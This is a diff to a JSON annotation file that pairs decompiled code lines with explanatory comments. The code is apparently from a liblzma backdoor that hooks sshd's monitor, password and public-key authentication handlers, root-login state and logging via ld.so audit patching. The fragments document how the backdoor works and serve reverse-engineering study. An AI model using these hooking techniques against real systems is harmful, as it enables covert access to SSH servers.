@@ -130,8 +130,32 @@
         "comment": "Walk `_r_debug` to populate the live module handles and capture the hook entries that will later be written back into liblzma."
       },
       {
+        "match": "sshd_ctx_cursor->mm_request_send_start = loader_data.sshd_string_refs.mm_request_send.func_start;",
+        "comment": "Seed the `mm_request_send` bounds from the cached string references so the privsep dispatcher we fingerprinted earlier becomes available to the monitor hooks without another scan."
+      },
+      {
+        "match": "sshd_ctx_cursor->STR_without_password = string_cursor;",
+        "comment": "Cache the \"without password\" literal pointer so the log shim can spot authpassword prompts without rescanning `.rodata`."
+      },
+      {
+        "match": "sshd_ctx_cursor->STR_publickey = string_cursor;",
+        "comment": "Record the publickey literal once so the KEYALLOWED/KEYVERIFY hooks can reuse it when massaging monitor replies."
+      },
+      {
+        "match": "if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||",
+        "comment": "Only start the relocation hunt after at least one monitor handler resolves; the ensuing scan lines up their shared format literal so we know exactly which relocation slot to patch."
+      },
+      {
+        "match": "literal_scan_slot = CONCAT44(*(uint *)((u8 *)&literal_scan_slot + 4),0x198);",
+        "comment": "Walk every relocation that references EncodedStringId 0x198 (the shared auth-log literal) so mm_answer_authpassword/keyallowed can be paired with the pointer we later rewrite."
+      },
+      {
         "match": "probe_success = find_dl_audit_offsets(&loader_data.data_handle,&link_map_delta,hooks_data,imported_funcs)",
         "comment": "Resolve `_dl_audit*` metadata plus the `link_map` displacement before patching ld.so\u2019s audit tables."
+      },
+      {
+        "match": "malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);",
+        "comment": "Carve a fake `malloc_usable_size` stub inside liblzma's allocator arena so the shim can observe libc's import tally without calling real libc."
       },
       {
         "match": "probe_success = sshd_find_sensitive_data",
@@ -142,8 +166,16 @@
         "comment": "Locate the global monitor struct so the mm hook wrappers can patch sockets, flags, and auth state safely."
       },
       {
+        "match": "((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;",
+        "comment": "A second hit on the auth-root literal means PermitRootLogin defaults to yes, so stash that state before publishing the pointer."
+      },
+      {
         "match": "probe_success = validate_log_handler_pointers",
         "comment": "Reject sshlogv handlers that fall outside `.data`; the log hook only executes if both pointers survive this validation."
+      },
+      {
+        "match": "sshd_log_ctx_ptr->sshlogv_impl = loader_data.sshd_string_refs.sshlogv_format.func_start;",
+        "comment": "Carry the `sshlogv` implementation pointer over from the earlier string-ref pass so the log hook never has to rediscover it."
       },
       {
         "match": "probe_success = secret_data_append_from_address",
